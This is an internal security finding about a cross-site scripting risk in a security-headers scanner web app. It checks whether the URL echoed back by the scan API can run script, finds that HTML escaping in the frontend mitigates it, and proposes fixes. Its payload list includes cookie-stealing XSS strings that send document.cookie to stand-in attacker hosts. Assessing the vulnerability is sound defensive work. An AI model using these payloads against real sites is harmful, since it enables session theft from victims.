# Attack 02 — XSS via Malicious URL in Scan Response

## Status: PARTIALLY MITIGATED — needs verification

## Description
The scan API echoes back the submitted URL in its JSON response. If the frontend renders this URL value directly into the DOM without escaping, an attacker can craft a URL containing an XSS payload and share a link that triggers script execution when the victim clicks "Scan".

## Attack Payload
```
https://evil.com/<script>alert(document.cookie)</script>
https://evil.com/<img src=x onerror=document.location='https://steal.com/?c='+document.cookie>
https://evil.com/"><svg/onload=fetch('https://c2.evil.com/?x='+btoa(document.cookie))>
```

## Attack Steps

### Step 1 — Craft a malicious "URL"
The scan endpoint accepts any string as URL. Inject HTML/JS:
```
POST /scan {"url":"https://evil.com/<script>alert(1)</script>"}
```

### Step 2 — Observe the response
```json
{
  "url": "https://evil.com/<script>alert(1)</script>",
  "score": 0,
  "grade": "F",
  ...
}
```
The script tag is returned verbatim in the JSON.

### Step 3 — Trigger victim rendering
If the frontend does `element.innerHTML = data.url` or `element.textContent` is bypassed, the script executes.

Alternatively, craft a shareable report URL:
```
https://secureheaders-scanner.netlify.app/#report/<base64-encoded-scan-with-xss-url>
```
Victim opens the link, the report auto-loads, XSS fires.

## Test Results

### API response
```bash
curl -X POST .../scan -d '{"url":"https://evil.com/<script>alert(1)</script>"}'
# Response: {"url":"https://evil.com/<script>alert(1)</script>","score":0,...}
```
Script tag is echoed. API does NOT sanitize.

### Frontend mitigation check
In `public/index.html`, the URL is rendered via:
```js
escHtml(data.url)  // used in the UI
```
`escHtml()` converts `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, etc.

This **prevents** the XSS from firing in normal scan flow.

### Shared report path
The full scan result (including `url`) is base64-encoded into the URL hash.
When loaded from hash, `data.url` is passed through `escHtml()` before rendering.
**Likely safe** — but needs browser-level verification.

## Severity: MEDIUM (API-level), LOW (frontend-level due to escaping)

## What to fix

### Fix 1 — Validate URL format in scan.js before accepting
```js
// In scan.js, add URL validation at the top of the handler:
function isValidUrl(str) {
  try {
    const u = new URL(str.startsWith('http') ? str : 'https://' + str);
    return ['http:', 'https:'].includes(u.protocol);
  } catch { return false; }
}

// In handler:
if (!isValidUrl(url)) {
  return { statusCode: 400, headers: cors, body: JSON.stringify({ error: 'Invalid URL format' }) };
}
```

### Fix 2 — Always use escHtml() when inserting any user-controlled value into DOM
Audit every `innerHTML` assignment in index.html to confirm no raw `data.url` insertion.

## Risk if Unfixed
An attacker posts a malicious "scan link" on social media. Victim clicks it, report auto-loads from URL hash, XSS fires if any rendering path skips escaping. Attacker steals session/localStorage data (including all saved scan history).
